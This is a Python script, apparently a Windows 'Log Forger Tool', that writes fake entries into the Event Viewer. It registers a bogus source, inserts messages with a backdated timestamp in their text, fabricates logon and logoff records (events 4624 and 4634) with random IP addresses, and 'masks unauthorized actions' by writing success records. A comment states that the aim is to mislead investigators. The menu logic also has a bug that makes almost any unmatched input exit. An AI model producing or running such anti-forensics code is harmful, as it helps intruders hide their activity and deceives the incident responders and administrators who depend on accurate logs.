import win32evtlogutil
import win32evtlog
import random

def main():
    while True:
        print("\nLog Forger Tool")
        print("1. Execute Log Forger Script")
        print("2. Create Log with Custom Timestamp")
        print("3. Create False Login/Logout Log")
        print("4. Mask Unauthorized Actions")
        print("5. Exit")
        choice = input("Enter your choice: ")
        
        if choice == "1":
            create_forged_event()
        elif choice == "2":
            execute_log_with_custom_timestamp()
        elif choice == "3":
            inject_false_user_activity()
        elif choice == "4":
            mask_unauthorized_actions()
        elif choice == "5" or "exit":
            print("Exiting...")
            break
        else:
            print("Invalid choice. Please select again.")


def create_forged_event():
    source_name = "FakeSource"
    message = "This is a forged log entry to mislead investigators."
    
    # Register the source (if not already registered)
    try:
        win32evtlogutil.AddSourceToRegistry(source_name, "Application")
    except Exception as e:
        print(f"Source already exists: {e}")
    
    # Write the event
    try:
        win32evtlogutil.ReportEvent(
            source_name,
            eventID=1001,
            eventType=win32evtlog.EVENTLOG_INFORMATION_TYPE,
            strings=[message]
        )
        print("[+] Forged log written to Event Viewer")
    except Exception as e:
        print(f"Failed to write log: {e}")


from datetime import datetime, timedelta

def execute_log_with_custom_timestamp():
    source_name = "FakeSource"
    message = input("Enter the message to include in the forged log: ")
    
    # Set a custom timestamp
    custom_time = datetime.now() - timedelta(days=7)
    custom_time_str = custom_time.strftime("%Y-%m-%d %H:%M:%S")
    
    try:
        win32evtlogutil.AddSourceToRegistry(source_name, "Application")
    except Exception as e:
        print(f"Source already exists: {e}")

    try:
        win32evtlogutil.ReportEvent(
            source_name,
            eventID=1003,  # New event ID for backdated log
            eventType=win32evtlog.EVENTLOG_INFORMATION_TYPE,
            strings=[f"[Timestamp: {custom_time_str}] {message}"]
        )
        print(f"[+] Forged log with custom timestamp written: {custom_time_str}")
    except Exception as e:
        print(f"Failed to write log: {e}")

def inject_false_user_activity():
    source_name = "Application"  # Write to Application log
    user = input("Enter the username to inject activity for: ")
    activity = input("Enter the activity (e.g., login, logout): ")
    
    # Generate a random IP address
    ip_address = generate_random_ipv4() if random.random() < 0.8 else generate_random_ipv6()

    if activity.lower() == "login":
        event_id = 4624  # Event ID for successful login
        message = (
            f"An account was successfully logged on.\n"
            f"Subject:\n"
            f"\tSecurity ID: SYSTEM\n"
            f"\tAccount Name: {user}\n"
            f"\tLogon ID: 0x3E7\n"
            f"Network Information:\n"
            f"\tSource Network Address: {ip_address}\n"
        )
    elif activity.lower() == "logout":
        event_id = 4634  # Event ID for logoff
        message = (
            f"An account was logged off.\n"
            f"Subject:\n"
            f"\tSecurity ID: SYSTEM\n"
            f"\tAccount Name: {user}\n"
            f"\tLogon ID: 0x3E7\n"
        )
    else:
        print("[!] Invalid activity. Please choose 'login' or 'logout'.")
        return

    try:
        win32evtlogutil.ReportEvent(
            source_name,
            eventID=event_id,
            eventType=win32evtlog.EVENTLOG_INFORMATION_TYPE,
            strings=[message]
        )
        print(f"[+] False user activity injected into Application log: {message}")
    except Exception as e:
        print(f"Failed to inject activity: {e}")


def mask_unauthorized_actions():
    source_name = "Application"
    user = input("Enter the username to mask: ")

    unauthorized_event_id = 4625  # Failed login
    authorized_event_id = 4624    # Successful login

    ip_address = generate_random_ipv4() if random.random() < 0.8 else generate_random_ipv6()

    message = (
        f"An account was successfully logged on.\n"
        f"Subject:\n"
        f"\tSecurity ID: SYSTEM\n"
        f"\tAccount Name: {user}\n"
        f"\tLogon ID: 0x3E7\n"
        f"Network Information:\n"
        f"\tSource Network Address: {ip_address}\n"
    )

    try:
        print(f"[DEBUG] Writing masked action to {source_name} log...")
        win32evtlogutil.ReportEvent(
            source_name,
            eventID=authorized_event_id,
            eventType=win32evtlog.EVENTLOG_INFORMATION_TYPE,
            strings=[message]
        )
        print(f"[+] Unauthorized action masked for user '{user}' in {source_name} log.")
    except Exception as e:
        print(f"[!] Failed to mask unauthorized action: {e}")



def generate_random_ipv4():
    # Generate public IPv4 address
    while True:
        ip = f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
        if not (10 <= int(ip.split('.')[0]) <= 127 or ip.startswith("192.168") or ip.startswith("172.16")):
            return ip

def generate_random_ipv6():
    # Generate random IPv6 address
    return ":".join(f"{random.randint(0, 65535):x}" for _ in range(8))

if __name__ == "__main__":
    main()